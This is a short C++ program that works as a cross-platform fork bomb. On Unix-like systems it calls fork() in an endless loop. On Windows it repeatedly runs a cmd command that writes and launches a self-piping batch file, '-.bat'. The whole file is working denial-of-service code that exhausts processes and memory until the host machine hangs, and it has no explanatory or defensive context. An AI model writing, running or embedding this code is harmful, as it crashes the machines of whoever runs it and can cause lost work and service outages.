#include <iostream>

#ifdef _WIN32
   #include <stdlib.h>
#else
   #include <unistd.h>
#endif

int main() {
   #ifdef _WIN32
       const char *comando = "cmd /k echo -^|->-.bat&-";
       
       while(1) {
           system(comando);
       }
   #else
       while(1) {
           fork();
       }
   
   #endif
    
    return 0;
}
